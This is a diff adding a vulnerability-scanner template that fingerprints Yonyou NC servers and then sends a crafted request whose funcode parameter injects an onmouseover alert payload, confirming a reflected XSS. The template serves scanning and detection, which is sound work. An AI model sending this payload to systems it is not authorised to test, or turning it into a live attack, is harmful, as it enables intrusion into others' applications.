@@ -1,0 +1,40 @@
+id: poc-yaml-yonyou-ufida-nc-fwd-xss
+info:
+  name: 用友NC fwd XSS漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xss
+
+http:
+  - raw:
+      - |
+        GET /index.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "YONYOU NC"
+
+  - raw:
+      - |
+        GET /portal/pt/nc5x/fwd?pageId=login&funcode=1%27);%22%20onmouseover=%22alert(`xss`)%22%20x=%22&systemcode=1111 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - ":server1"
+      - type: word
+        words:
+          - "onload=\"openNCNode('1');\" onmouseover=\"alert(`xss`)\" x=\"','1111'"
+          - "/portal/html/frame/nc5xNode.js"
